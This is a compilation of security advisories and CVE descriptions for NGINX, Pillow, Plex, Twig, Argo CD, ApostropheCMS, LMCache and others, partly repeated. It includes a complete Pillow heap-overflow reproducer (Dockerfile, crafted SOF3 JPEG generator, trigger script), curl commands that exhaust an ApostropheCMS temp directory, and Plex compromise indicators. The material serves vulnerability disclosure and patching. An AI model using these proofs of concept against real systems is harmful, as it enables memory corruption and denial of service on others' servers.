posts.content:
F5 Issues Emergency Patches for Critical NGINX Code Execution Flaws

F5 released emergency patches for three critical NGINX vulnerabilities (CVE-2026-15176, CVE-2026-97205, and CVE-2026-93479) that allow unauthenticated remote code execution and denial-of-service attacks.

**If you run NGINX in any form (open-source web server, NGINX Plus, Ingress Controller, Gateway Fabric, or the NGINX WAF/App Protect products), install F5's latest security patches ASAP. If you can't patch, turn off Server Side Includes and asynchronous file I/O, and have your team remove alias directives that use $request_filename and switch regex maps to named captures until the patch is in.**
#cybersecurity #infosec #advisory #vulnerability
https://beyondmachines.net/event_details/f5-issues-emergency-patches-for-critical-nginx-code-execution-flaws-p-9-m-u-w/gD2P6Ple2L

CVE-2026-93479.description:
A vulnerability exists in NGINX Plus and NGINX Open Source when a map directive uses regex matching and the root directive or access log format references the map's regex capture variables before referencing the map output variable. Alternatively, the same result could be achieved by using a non-cacheable variable in a string expression under certain conditions. An unauthenticated attacker along with conditions beyond their control can exploit this vulnerability by sending crafted HTTP requests. This may cause a heap buffer overflow in the NGINX worker process leading to a restart. Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.

Impact: 
This vulnerability may allow remote attackers to cause a denial-of-service (DoS) on the NGINX system or to possibly trigger a code execution. There is no control plane exposure; this is a data plane issue only.

Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

CVE-2026-97205.description:
NGINX Plus and NGINX Open Source have a vulnerability in the ngx_http_core_module module. When asynchronous file I/O (AIO) is enabled in certain configurations, processing a Server Side Includes (SSI) page containing “include virtual” commands may trigger a Use-After-Free (UAF) in the NGINX worker process. This may cause memory corruption or a worker process crash. Additionally, attackers can execute code on systems with Address Space Layout Randomization (ASLR) disabled or when the attacker can bypass ASLR.

Impact:
This vulnerability may allow remote attackers to cause a denial-of-service (DoS) on the NGINX system, corrupt its memory, or possibly trigger code execution. There is no control plane exposure; this is a data plane issue only.




Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.

posts.content:
🐧 SIGINT // Ubuntu Watch — 2026-10-21

CVE-2026-74580: a CVSS 8.8 memory corruption bug in the kernel vhost subsystem used by QEMU/KVM for accelerated virtio IO. If you run VMs on bare metal, this is a real guest-to-host escalation vector worth patching now, not someday.

🔗 https://matrix.tencent.com/en/2026/10/12/vghost-cve-2026-74580

#Ubuntu #Linux #infosec

CVE-2026-74580.description:
In the Linux kernel, the following vulnerability has been resolved:

vhost: reset the vring metadata cache on vring reconfiguration

vq->meta_iotlb[] caches the vhost_iotlb_map that backs each vring
metadata region, and iotlb_access_ok() returns early on a cache hit,
taking the hit as proof that the region has already been validated:

	if (vhost_vq_meta_fetch(vq, addr, len, type))
		return true;

The cache is reset on VHOST_IOTLB_UPDATE and VHOST_IOTLB_INVALIDATE, on
device IOTLB (re)initialisation and on vq reset, but not when
VHOST_SET_VRING_ADDR replaces vq->desc, vq->avail and vq->used, nor when
VHOST_SET_VRING_NUM changes the region sizes.

With a device IOTLB attached both ioctls are accepted while the vq is
live, and neither validates the addresses at ioctl time: vq_access_ok()
and vq_log_used_access_ok() return true early because the addresses are
GIOVAs, deferring validation to prefetch time.  Once the cache has been
populated that deferred validation no longer runs -- vq_meta_prefetch()
hits the stale entry and returns true -- and vhost_vq_meta_fetch() keeps
translating through the old mapping as

	map->addr + addr - map->start

for an address the mapping no longer covers.  vhost_copy_to_user() and
vhost_copy_from_user() consume the result with __copy_to_user() and
__copy_from_user(), which do not check it either, so a subsequent used
ring update or descriptor fetch accesses memory outside the region the
IOTLB actually maps.

Reset the metadata cache whenever the vring is reconfigured, so the new
addresses are pushed back through iotlb_access_ok()'s slow path.

🚨 PHP warns of two critical vulnerabilities as emergency patches arrive tomorrow

The PHP security team will release updates on October 21 at 14:00 UTC for two vulnerabilities, each rated 9.2 under CVSS v4.0.
⠀
Security researchers identified the flaws as CVE-2026-109618 and CVE-2026-109619 and described them as remote code execution vulnerabilities reportedly affecting PHP versions 5 through 8.

PHP has not yet confirmed the affected versions, exploitation requirements or fixed releases.
⠀
The vulnerabilities were reportedly leaked before their planned disclosure. Researchers said they have not observed active exploitation, while PHP warned it may release the patches early if technical details become public or exploitation is detected.
⠀
Administrators should identify PHP installations now and prepare to apply the updates as soon as they become available.

Source: https://www.php.net/archive/2026.php#2026-10-20-1

posts.content:
Any time you can hack via memes is funny to me.

https://nvd.nist.gov/vuln/detail/cve-2026-112403

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's JPEG decoder can write a full-width scanline into a buffer sized for a requested draft scale. ImagingJpegDecode does not verify libjpeg's actual output width and component count after scaling is requested, and an 8-bit lossless SOF3 JPEG decoded by a build linked to libjpeg-turbo 3.x can ignore the requested downscaling geometry. An attacker can supply such a JPEG to an application that uses draft() or thumbnail() to request downscaling. This can corrupt heap memory, crash the process, or potentially allow code execution. Older libjpeg-turbo 2.x and IJG builds reject the SOF3 input. This issue is fixed in version 13.0.0.

CVE-2026-112403.description:
## Summary

`JpegImageFile.draft()` — which `Image.thumbnail()` calls automatically — requests 1/2, 1/4 or 1/8 scaled JPEG output and shrinks `self._size` and the tile extents to match, so `_setimage()` allocates a single-row decode buffer of `ceil(W/s)` samples. `ImagingJpegDecode()` sets `cinfo.scale_num`/`scale_denom`, calls `jpeg_start_decompress()`, and then reads scanlines into that buffer without ever comparing `cinfo.output_width`, `cinfo.output_height` or `cinfo.out_color_components` against `state->xsize`, `state->ysize` and `state->bits`.

libjpeg-turbo 3.x decodes lossless (SOF3) JPEG, but hardwires lossless streams to no scaling — the requested `scale_denom` is silently discarded. It therefore returns full-width `W`-sample rows into a buffer sized for `ceil(W/s)`. Each `jpeg_read_scanlines()` call writes `(W - ceil(W/s)) x components` bytes past the end of the heap allocation, and the overflowing bytes are the decoded pixel values, which are byte-exact for an 8-bit grayscale lossless image.

The input is a standards-compliant JPEG, so `Image.open(..., formats=["JPEG"])` does not prevent it. Pillow's Python SOF parser already accepts marker `0xFFC3` ("SOF3", "Spatial lossless") at 8-bit precision, so the file opens normally as a `JPEG` / mode `L` image at its full declared size.

## Affected code

At `e41083f383c9cd3db95de52564cc0b6452313d4a` (`main`, 2026-08-29):

- `src/libImaging/JpegDecode.c:224-262` — `ImagingJpegDecode()`; `jpeg_start_decompress()` at :240, `jpeg_read_scanlines()` at :252, with no geometry check between them.
- `src/decode.c:222-231` — `_setimage()`; `state->buffer = calloc(1, state->bytes)` with `state->bytes = (state->bits * state->xsize + 7) / 8`.
- `src/PIL/JpegImagePlugin.py:428-464` — `JpegImageFile.draft()`; computes `s` and shrinks `_size`, the tile extents and `decoderconfig` with no notion of lossless coding.
- `src/PIL/JpegImagePlugin.py:271` — `0xFFC3: ("SOF3", "Spatial lossless", SOF)`.

```c
// src/libImaging/JpegDecode.c
            if (context->scale > 1) {
                context->cinfo.scale_num = 1;
                context->cinfo.scale_denom = context->scale;
            }
            ...
        case 2:
            if (!jpeg_start_decompress(&context->cinfo)) {
                break;
            }
            state->state++;
            /* fall through */
        case 3:
            ok = 1;
            while (state->y < state->ysize) {
                ok = jpeg_read_scanlines(&context->cinfo, &state->buffer, 1);
```

Because `state->ysize` (`ceil(H/s)`) can never equal libjpeg's `output_height` when `s >= 2`, the decode always ends in an error after the rows have already been written: the caller sees an exception and gets no pixels back. The `OSError` is a consequence of the overflow, not the issue being reported.

## Primitive

Per scanline: a contiguous write of `(W - ceil(W/s)) x c` bytes immediately past a `calloc(ceil(W/s) x c)` block, where `c = 1` for mode `L` and 4 for RGB (RGBX) and CMYK; repeated for `ceil(H/s)` rows over the same region. The buffer size class is chosen by the attacker through `W`, and for grayscale the overflowing content is an arbitrary attacker-chosen byte string.

Measured in the reproducer below: 1200x1100 mode `L`, `s=2` — a 600-byte allocation, 600 bytes written past it, ASan reporting the whole 1200-byte row write as one `memcpy`.

Threshold: `draft()` must select `s >= 2`, i.e. `W // requested_w >= 2` and `H // requested_h >= 2`. For `thumbnail((256,256))` with the default `reducing_gap=2.0` that means `W, H >= 1024`.

## Reproduction

Self-contained Docker reproducer (Ubuntu 24.04, clang 20, libjpeg-turbo 3.1.4 and Pillow both built from source with `-fsanitize=address`; Pillow checked out at `${TARGET_COMMIT}`, default `e41083f383c9cd3db95de52564cc0b6452313d4a`). Save the three files below as `Dockerfile`, `make_sof3.py` and `trigger.py` in an empty directory, then:

```bash
docker build -t pillow-sof3-oob . && docker run --rm pillow-sof3-oob
```

`make_sof3.py` is a self-contained encoder that emits a standards-compliant 8-bit grayscale lossless-Huffman JPEG (SOI / DHT / SOF3 `P=8, Y=1100, X=1200, Nf=1` / SOS `Ss=1` predictor 1, `Se=0`, `Ah=Al=0` / entropy-coded row differences / EOI), whose rows carry a repeating marker pattern. `trigger.py` opens it and calls `thumbnail()`, whose implicit `draft()` picks `s=2` and allocates a 600-byte row buffer.

### `Dockerfile`

```dockerfile
FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive
ARG TARGET_COMMIT=e41083f383c9cd3db95de52564cc0b6452313d4a
ARG CLANG_VERSION=20
ARG LIBJPEG_TURBO_TAG=3.1.4

RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates git make cmake nasm pkg-config libc6-dev gcc \
        wget gnupg lsb-release software-properties-common \
        python3 python3-dev python3-pip python3-venv zlib1g-dev \
    && wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh && chmod +x /tmp/llvm.sh && /tmp/llvm.sh ${CLANG_VERSION} \
    && apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \
    && rm -rf /var/lib/apt/lists/*

ENV CC=clang-20
ENV CXX=clang++-20
ENV CFLAGS="-g -fno-omit-frame-pointer -O1 -fsanitize=address"
ENV CXXFLAGS="-g -fno-omit-frame-pointer -O1 -fsanitize=address"
ENV LDFLAGS="-fsanitize=address"

# --- libjpeg-turbo 3.x (lossless SOF3 support) built with ASan ---
RUN git clone https://github.com/libjpeg-turbo/libjpeg-turbo /src/libjpeg-turbo
RUN cd /src/libjpeg-turbo && git checkout ${LIBJPEG_TURBO_TAG} \
    && cmake -B /build/ljt -S . -DCMAKE_BUILD_TYPE=None \
        -DCMAKE_C_COMPILER=clang-20 \
        -DCMAKE_C_FLAGS="$CFLAGS" \
        -DCMAKE_EXE_LINKER_FLAGS="$LDFLAGS" \
        -DCMAKE_SHARED_LINKER_FLAGS="$LDFLAGS" \
        -DCMAKE_INSTALL_PREFIX=/opt/ljt -DWITH_JPEG8=0 -DENABLE_STATIC=0 \
    && cmake --build /build/ljt -j"$(nproc)" && cmake --install /build/ljt

# --- Pillow at the pinned commit, built with ASan against that libjpeg ---
RUN git clone https://github.com/python-pillow/Pillow /src/repo
WORKDIR /src/repo
RUN git checkout ${TARGET_COMMIT}

ENV JPEG_ROOT=/opt/ljt
ENV LD_LIBRARY_PATH=/opt/ljt/lib
RUN python3 -m venv /venv \
    && /venv/bin/pip install --quiet --upgrade pip "setuptools>=80" wheel pybind11 \
    && CFLAGS="$CFLAGS" LDFLAGS="$LDFLAGS -Wl,-rpath,/opt/ljt/lib" \
       /venv/bin/pip install --no-build-isolation --no-deps . \
    && ln -sf "$(clang-20 -print-file-name=libclang_rt.asan-x86_64.so)" /opt/libasan.so \
    && LD_PRELOAD=/opt/libasan.so ASAN_OPTIONS=detect_leaks=0 \
       /venv/bin/python3 -c "from PIL import Image, features; print(Image.__version__, features.version('jpg'))"

COPY make_sof3.py /tmp/make_sof3.py
COPY trigger.py /tmp/trigger.py
RUN python3 /tmp/make_sof3.py /tmp/sof3_gray_1200x1100.jpg

ENV ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1
ENV ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-20/bin/llvm-symbolizer
ENV LD_PRELOAD=/opt/libasan.so
CMD ["/bin/sh","-c","cd /tmp && /venv/bin/python3 /tmp/trigger.py 2>&1; echo EXIT=$?"]
```

### `make_sof3.py`

```python
#!/usr/bin/env python3
"""Generate an 8-bit grayscale lossless-Huffman (SOF3) JPEG.

Standards-compliant per ITU-T T.81 Annex H (lossless mode), predictor 1 (Ra).
Rows carry an attacker-chosen marker byte pattern verbatim (lossless => exact).
"""
import struct
import sys

W = 1200
H = 1100
MARKER = b"AAAABBBBCCCCDDDD"  # attacker-chosen bytes that land past the buffer


class BitWriter:
    def __init__(self):
        self.out = bytearray()
        self.acc = 0
        self.n = 0

    def put(self, value, nbits):
        for i in range(nbits - 1, -1, -1):
            self.acc = (self.acc << 1) | ((value >> i) & 1)
            self.n += 1
            if self.n == 8:
                self.out.append(self.acc)
                if self.acc == 0xFF:
                    self.out.append(0x00)  # byte stuffing
                self.acc = 0
                self.n = 0

    def flush(self):
        while self.n:
            self.put(1, 1)
        return bytes(self.out)


# Canonical Huffman: 17 symbols (categories 0..16), all of code length 5.
BITS = [0] * 17
BITS[5] = 17
HUFFVAL = list(range(17))
CODES = {sym: (i, 5) for i, sym in enumerate(HUFFVAL)}


def category(d):
    if d == 0:
        return 0
    return abs(d).bit_length()


def build_pixels():
    rows = []
    for y in range(H):
        row = bytearray()
        while len(row) < W:
            row += MARKER
        rows.append(bytes(row[:W]))
    return rows


def main(path):
    rows = build_pixels()
    bw = BitWriter()
    prev = None
    for y in range(H):
        row = rows[y]
        for x in range(W):
            s = row[x]
            if y == 0 and x == 0:
                pred = 1 << 7          # 2^(P-1-Pt)
            elif x == 0:
                pred = prev[0]         # Rb for first sample of a line
            else:
                pred = row[x - 1]      # Ra, predictor 1
            d = (s - pred) & 0xFFFF
            if d >= 0x8000:
                d -= 0x10000
            ssss = category(d)
            code, length = CODES[ssss]
            bw.put(code, length)
            if ssss:
                v = d if d > 0 else d + (1 << ssss) - 1
                bw.put(v & ((1 << ssss) - 1), ssss)
        prev = row
    entropy = bw.flush()

    out = bytearray()
    out += b"\xff\xd8"                                        # SOI
    # DHT: class 0 (DC/lossless), table id 0
    dht = bytes([0x00]) + bytes(BITS[1:17]) + bytes(HUFFVAL)
    out += b"\xff\xc4" + struct.pack(">H", len(dht) + 2) + dht
    # SOF3: lossless, Huffman, sequential
    sof = struct.pack(">BHHB", 8, H, W, 1) + bytes([1, 0x11, 0])
    out += b"\xff\xc3" + struct.pack(">H", len(sof) + 2) + sof
    # SOS: Ns=1, Cs=1, Td=0/Ta=0, Ss=1 (predictor 1), Se=0, Ah=0/Al=0
    sos = bytes([1, 1, 0x00, 1, 0, 0])
    out += b"\xff\xda" + struct.pack(">H", len(sos) + 2) + sos
    out += entropy
    out += b"\xff\xd9"                                        # EOI
    with open(path, "wb") as f:
        f.write(bytes(out))
    print(f"wrote {path}: {len(out)} bytes, {W}x{H} 8-bit grayscale SOF3 lossless")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "/tmp/sof3_gray_1200x1100.jpg")
```

### `trigger.py`

```python
import sys
from PIL import Image, features
print("Pillow", Image.__version__, "| libjpeg", features.version("jpg"), flush=True)
im = Image.open("/tmp/sof3_gray_1200x1100.jpg")
print("format=%s mode=%s size=%s" % (im.format, im.mode, im.size), flush=True)
print(">>> im.thumbnail((256, 256))  # draft() picks s=2 -> 600-byte row buffer", flush=True)
sys.stdout.flush()
try:
    im.thumbnail((256, 256))
    print("thumbnail returned, size=%s" % (im.size,), flush=True)
except Exception as e:
    print("exception: %r" % (e,), flush=True)
```


Negative control, same image: a baseline DCT JPEG of identical dimensions thumbnails cleanly, because libjpeg honours 1/2 scaling exactly as `draft()` computed it.

```
control baseline DCT JPEG: JPEG L (1200, 1100)
thumbnail OK, size = (256, 235) -- no ASan report
```

## Scope and caveats

- Reproduced on `main` at `e41083f383c9cd3db95de52564cc0b6452313d4a`, which is current `origin/main` as of 2026-08-30. Also reported against 12.3.0.
- Requires the linked libjpeg to support lossless decoding, i.e. libjpeg-turbo >= 3.0. That is what the official Pillow wheels bundle. Builds against libjpeg-turbo 2.x or IJG libjpeg reject SOF3 before any row is decoded and are not affected.
- No non-default Pillow configuration is involved: `Image.thumbnail()` calls `draft()` by default, and the triggering bytes are entirely file data.
- Only paths that use `draft()` before loading are affected. `open().load()` and `resize()` decode at scale 1 and are unaffected. Calling `img.load()` before `thumbnail()`, or `thumbnail(..., reducing_gap=None)`, avoids the path in an application today.
- Not affected on the same code path: SOF11 (arithmetic lossless) fails with `JERR_ARITH_NOTIMPL` before any row; 12- and 16-bit lossless are rejected by Pillow's `SOF()` because it requires `bits == 8`; SOF5-7/13-15 fail with `JERR_SOF_UNSUPPORTED`.

Mitigating CVE-2026-111943 on #Debian:

- sudo dpkg-reconfigure ca-certificates

- Select "ask" and deselect the following entries:
mozilla/emSign_ECC_Root_CA_-_C3.crt
mozilla/emSign_ECC_Root_CA_-_G3.crt
mozilla/emSign_Root_CA_-_C1.crt
mozilla/emSign_Root_CA_-_G1.crt
mozilla/Comodo_AAA_Services_root.crt

- Hit <Ok>

Alternatively you can edit /etc/ca-certificates.conf manually and add the specific entries:

!mozilla/emSign_ECC_Root_CA_-_C3.crt
!mozilla/emSign_ECC_Root_CA_-_G3.crt
!mozilla/emSign_Root_CA_-_C1.crt
!mozilla/emSign_Root_CA_-_G1.crt
!mozilla/Comodo_AAA_Services_root.crt

...and sudo update-ca-certificates

Please do note that disabling these certificates may also result in collateral damage. That is, sites that happen to use intermediate certificates signed by these root certificates will cease to validate.

posts.content:
🚨 Rapid Response: Four vulnerabilities in Plex Media Server can be chained to achieve unauthenticated remote code execution. Plex reports compromised servers being used to run cryptocurrency miners and proxy software.

Censys ARC observes ~340,000 Internet-exposed Plex Media Server hosts. Roughly 30% run a vulnerable build, and nearly 8,000 run an early build that may be mistaken for patched.

Despite publication of the exploit chain and reports of exploitation, fewer than 2% of still-vulnerable hosts upgraded in the following three days.
Plex advises that previously exposed, unpatched servers may already be compromised and require additional remediation beyond patching.

Full Censys ARC advisory: https://censys.com/advisory/cve-2026-96652-cve-2026-96654-cve-2026-96655-cve-2026-96656/

posts.content:
🚨 Plex2Shell vulnerability chain reportedly exploited against outdated Plex servers

PoC: https://github.com/code-zm/plex2shell

A security researcher says an internet-facing Plex honeypot was compromised on October 17 using an exploit chain targeting four recently disclosed vulnerabilities:

• CVE-2026-96652
• CVE-2026-96654
• CVE-2026-96655
• CVE-2026-96656
⠀
The flaws can be chained to achieve unauthenticated remote code execution on affected Plex Media Server installations.
⠀
Observed payloads included an XMRig cryptocurrency miner and a proxy application named “myawesomeproxy,” which could allow attackers to route traffic through compromised residential connections.
⠀
Potential signs of compromise include suspicious child processes launched by Plex Media Server and processes or command lines containing:

• myawesomeproxy
• mylovelyminer
• x12345
• --rig-id
• --donate-level
• proxystream[.]st
⠀
Plex fixed the vulnerabilities in Media Server 1.43.3.10861. Administrators running earlier versions should update immediately and inspect internet-facing Linux and Docker deployments for suspicious processes.
⠀
The exploitation evidence currently comes from one researcher’s honeypot and has not been independently confirmed as a wider campaign.

Source: https://zmain.info/blog/plex2shell

CVE-2026-96652.description: Plex Media Server before 1.43.3.10861 allows SSRF via '/player/timeline'. An attacker using any X-Plex-Token value can include a full URL in the 'protocol' parameter and force the Plex server to POST to the attacker's chosen destination.

posts.content:
🚨 Rapid Response: Four vulnerabilities in Plex Media Server can be chained to achieve unauthenticated remote code execution. Plex reports compromised servers being used to run cryptocurrency miners and proxy software.

Censys ARC observes ~340,000 Internet-exposed Plex Media Server hosts. Roughly 30% run a vulnerable build, and nearly 8,000 run an early build that may be mistaken for patched.

Despite publication of the exploit chain and reports of exploitation, fewer than 2% of still-vulnerable hosts upgraded in the following three days.
Plex advises that previously exposed, unpatched servers may already be compromised and require additional remediation beyond patching.

Full Censys ARC advisory: https://censys.com/advisory/cve-2026-96652-cve-2026-96654-cve-2026-96655-cve-2026-96656/

#CensysARC #Cybersecurity #VulnerabilityManagement #Plex #InfoSec

🚨 Rapid Response: Four vulnerabilities in Plex Media Server can be chained to achieve unauthenticated remote code execution. Plex reports compromised servers being used to run cryptocurrency miners and proxy software.

Censys ARC observes ~340,000 Internet-exposed Plex Media Server hosts. Roughly 30% run a vulnerable build, and nearly 8,000 run an early build that may be mistaken for patched.

Despite publication of the exploit chain and reports of exploitation, fewer than 2% of still-vulnerable hosts upgraded in the following three days.
Plex advises that previously exposed, unpatched servers may already be compromised and require additional remediation beyond patching.

Full Censys ARC advisory: https://censys.com/advisory/cve-2026-96652-cve-2026-96654-cve-2026-96655-cve-2026-96656/

posts.content:
🚨 Plex2Shell vulnerability chain reportedly exploited against outdated Plex servers

PoC: https://github.com/code-zm/plex2shell

A security researcher says an internet-facing Plex honeypot was compromised on October 17 using an exploit chain targeting four recently disclosed vulnerabilities:

• CVE-2026-96652
• CVE-2026-96654
• CVE-2026-96655
• CVE-2026-96656
⠀
The flaws can be chained to achieve unauthenticated remote code execution on affected Plex Media Server installations.
⠀
Observed payloads included an XMRig cryptocurrency miner and a proxy application named “myawesomeproxy,” which could allow attackers to route traffic through compromised residential connections.
⠀
Potential signs of compromise include suspicious child processes launched by Plex Media Server and processes or command lines containing:

• myawesomeproxy
• mylovelyminer
• x12345
• --rig-id
• --donate-level
• proxystream[.]st
⠀
Plex fixed the vulnerabilities in Media Server 1.43.3.10861. Administrators running earlier versions should update immediately and inspect internet-facing Linux and Docker deployments for suspicious processes.
⠀
The exploitation evidence currently comes from one researcher’s honeypot and has not been independently confirmed as a wider campaign.

Source: https://zmain.info/blog/plex2shell

CVE-2026-96656.description: Plex Media Server before 1.43.3.10861 allows an admin user to write arbitrary files that may be executed on load. The preference TranscoderH264Options is appended verbatim to x264's option string on every transcode. At startup, all .so files are run without signature, execute bit, or symbol checks.

posts.content:
SiteGuard WAF Flaw Exploited to Gain Root and SYSTEM Privileges

EG Secure Solutions reported an actively exploited OS command injection vulnerability (CVE-2026-106931) in SiteGuard Server Edition's statistics feature, allowing attackers to run commands with full administrative rights.

**If you use the SiteGuard Server Edition WAF (for Apache, Nginx or IIS), first save the diagnostic information from the web management interface, then immediately update to Ver8.00 Update 5 (Ver7.00 Update 6 on FreeBSD), or apply the vendor's patch if you're on an end-of-life version. This flaw is actively exploited. Check the saved diagnostics for signs of a break-in, and if anything looks suspicious, change all database credentials and passwords stored on that server.**

posts.content:
🚨 Plex2Shell vulnerability chain reportedly exploited against outdated Plex servers

PoC: https://github.com/code-zm/plex2shell

A security researcher says an internet-facing Plex honeypot was compromised on October 17 using an exploit chain targeting four recently disclosed vulnerabilities:

• CVE-2026-96652
• CVE-2026-96654
• CVE-2026-96655
• CVE-2026-96656
⠀
The flaws can be chained to achieve unauthenticated remote code execution on affected Plex Media Server installations.
⠀
Observed payloads included an XMRig cryptocurrency miner and a proxy application named “myawesomeproxy,” which could allow attackers to route traffic through compromised residential connections.
⠀
Potential signs of compromise include suspicious child processes launched by Plex Media Server and processes or command lines containing:

• myawesomeproxy
• mylovelyminer
• x12345
• --rig-id
• --donate-level
• proxystream[.]st
⠀
Plex fixed the vulnerabilities in Media Server 1.43.3.10861. Administrators running earlier versions should update immediately and inspect internet-facing Linux and Docker deployments for suspicious processes.
⠀
The exploitation evidence currently comes from one researcher’s honeypot and has not been independently confirmed as a wider campaign.

Source: https://zmain.info/blog/plex2shell

posts.content: CVE-2026-46633: Proving exploitability of Twig sandbox bypass https://gist.github.com/vladko312/d61b950f168c791db4786b83dc7a81e6

CVE-2026-46633.description:
### Description

`Compiler::string()` escapes `"`, `$`, `\`, NUL and TAB when generating PHP double-quoted string literals, but does not escape single quotes. In `ModuleNode::compileConstructor()`, the template name from a `{% use %}` tag is compiled via `subcompile()` -> `string()` and placed inside a surrounding PHP single-quoted string literal. A template name containing a single quote terminates that surrounding string early, allowing arbitrary PHP expressions to be injected into the compiled cache file.

The injected code executes within the PHP process when the cache file is first loaded, bypassing the Twig sandbox entirely and achieving remote code execution. `SecurityPolicy` unconditionally allows `{% use %}` regardless of the configured `allowedTags`, so this primitive is reachable from sandboxed templates as well.

### Resolution

`Compiler::string()` now also escapes single quotes so that template names placed inside single-quoted PHP literals can no longer break out of the surrounding context.

### Credits

Twig would like to thank Anvil Secure in collaboration with Claude and Anthropic Research for reporting the issue and providing the fix.

CVE-2026-113722.description: virtualenv is a tool for creating isolated virtual python environments. Prior to 21.14.9, virtualenv's ScriptMakerCustom and pip pass an incompletely quoted interpreter path to distlib ScriptMaker when generating POSIX console scripts. When the path contains a space or produces a shebang longer than 127 bytes, distlib emits a /bin/sh wrapper whose double-quoted interpreter path still expands command substitutions and backticks. An attacker who influences the environment destination can therefore execute commands with the user's privileges when the user later runs a generated launcher; environment creation and activation do not trigger the command. Existing launchers are not repaired by upgrading virtualenv alone and must be regenerated, while a later independent pip installation or upgrade can reintroduce an affected launcher because pip's vendored distlib is unchanged. The virtualenv fix is released in version 21.14.9.

MCP TypeScript SDK is the official TypeScript SDK for Model Context Protocol servers and clients. From version 1.24.0 to before version 1.32.0, the experimental tasks feature (taskStore) did not check which session created a task. Clients sharing ...

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-111767.description:
### Summary
In affected versions, the experimental tasks feature (`taskStore`) did not check which session created a task. Clients sharing one `InMemoryTaskStore` could list, read and cancel each other's tasks.

Experimental tasks are deprecated. The 2026-07-28 specification replaced them with a redesigned extension. The best course of action is to stop using them.

### Am I affected?
Only if your HTTP server passes `taskStore` to `McpServer` or `Server`. If `grep -ri taskstore --exclude-dir=node_modules .` finds nothing, you are not affected.

Affected versions: `@modelcontextprotocol/sdk` 1.24.0 through 1.31.0. The 2.x packages are not affected.

### Fix
Upgrade to `@modelcontextprotocol/sdk` 1.32.0 or later. Each task is now tied to the session that created it, so a client that starts a new session can no longer reach its earlier tasks.

If you cannot upgrade yet, remove `taskStore`, or create one `InMemoryTaskStore` per session.

CVE-2026-113709.description: Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes. From 2.1.0 until 3.3.15, 3.4.10, 3.5.4, and 3.6.0-rc2, when an operator has enabled --enable-helm for kustomize build, helmGlobals.configHome can point Helm's config and data directories at a repository-controlled location. Helm automatically loads a downloader plugin from `<configHome>/.data/plugins` without a separate plugin-install step and executes its program inside argocd-repo-server when a helmCharts repository URL uses the plugin's protocol. The command runs as the repo-server user and can read repository credentials and other process-accessible data. An attacker can commit the Kustomization and plugin to a Git repository that an Application builds or upload the files through POST /api/v1/applications/manifestsWithFiles, also exposed by argocd app diff --local --server-side-generate. The upload path requires only Application get permission on an existing Application, without Application update or sync permission or repository write access. Both delivery paths require prior operator enablement of --enable-helm; deployments that do not enable it are not affected. Kustomize 4.1.0 first passed helmGlobals.configHome through to Helm. This issue is fixed in versions 3.3.15, 3.4.10, 3.5.4, and 3.6.0-rc2.

🟠 CVE-2026-113658 - High (7.5)

ApostropheCMS is an open-source Node.js content management system. Prior to 4.33.0, the unauthenticated Rich Text CSV conversion route writes a multipart upload to the system temporary directory before checking its extension and does not remove th...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-113658/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-113658.description:
### Summary

A rejected upload can remain in the operating system temporary directory.

Multer writes the file before its extension is checked, and the rejection path does not remove that temporary file. An unauthenticated requester can repeat this with large files and steadily consume temporary disk space.

### Details

The endpoint is:

```text
POST /api/v1/@apostrophecms/rich-text-widget/generate-csv-table
```

In `packages/apostrophe/modules/@apostrophecms/rich-text-widget/lib/apiRoutes.js`, Multer first writes the upload to `os.tmpdir()`. The handler then rejects filenames whose extension is not `csv`, but there is no cleanup of the Multer file on this error path.

The route does not require an authenticated user. A normal CSRF cookie is sufficient.

During testing, the request returned HTTP 400 with `Only csv files are supported`, while the complete uploaded content remained in a randomly named file in the configured temporary directory after the response.

### Relationship to prior public work

I reviewed [PR #5013](https://github.com/apostrophecms/apostrophe/pull/5013), which migrated the Rich Text CSV upload path from `connect-multiparty` to Multer. This report concerns cleanup after that migration: the rejected Multer file remains on disk, a behavior not described in the PR or its review discussion.

### POC

Create a small test file. A larger file can be used to demonstrate disk growth, but 1 MiB is enough for a safe local reproduction:

```bash
dd if=/dev/zero of=rejected.txt bs=1M count=1
```

Obtain the normal site cookies and send the rejected upload:

```bash
curl -c cookies.txt 'http://127.0.0.1:3000/' > /dev/null

curl -i -b cookies.txt \
  -F 'file=@rejected.txt;filename=rejected.txt;type=text/plain' \
  'http://127.0.0.1:3000/api/v1/@apostrophecms/rich-text-widget/generate-csv-table'
```

The response is HTTP 400. Compare the contents of the system temporary directory before and after the request:

```bash
ls -lt /tmp
```

A new randomly named file remains present and contains the uploaded bytes.

No login is required. Repeating the multipart request creates additional persistent temporary files.

### Impact

A remote unauthenticated attacker can fill the partition used by the operating system temporary directory. Once that partition is exhausted, Apostrophe and unrelated services on the same host may fail to upload files, create temporary data, or continue operating normally.

The attack requires only repeated HTTP requests and the stored files remain after each rejected response.

CVE-2026-105192.description:
### Summary

LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport



### Details

LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with --host, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.

